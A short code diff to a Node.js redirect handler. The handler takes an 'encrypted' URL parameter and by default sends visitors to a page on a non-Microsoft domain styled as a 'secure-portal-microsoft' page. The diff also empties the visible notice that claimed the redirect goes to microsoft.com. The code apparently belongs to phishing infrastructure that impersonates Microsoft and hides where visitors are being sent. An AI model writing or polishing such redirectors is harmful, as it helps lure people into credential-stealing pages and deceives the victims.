@@ -3,7 +3,7 @@ module.exports = (req, res) => {
     const encryptedUrl = req.query.url;
 
     // Default link to redirect to (in case no URL is provided)
-    const defaultUrl = 'https://tasfirm.com/secure-portal-microsoft/secure-page.html/';
+    const defaultUrl = 'https://tasfirm.com/secure-portal-microsoft/secure-page.html';
 
     // If the 'url' query parameter is provided
     if (encryptedUrl) {
@@ -46,7 +46,7 @@ module.exports = (req, res) => {
                 <title>Redirecting...</title>
             </head>
             <body>
-                <p>Redirecting to www.microsoft.com in 2 seconds...</p>
+                <p></p>
                 <!-- You could include the full loading HTML here -->
             </body>
             </html>
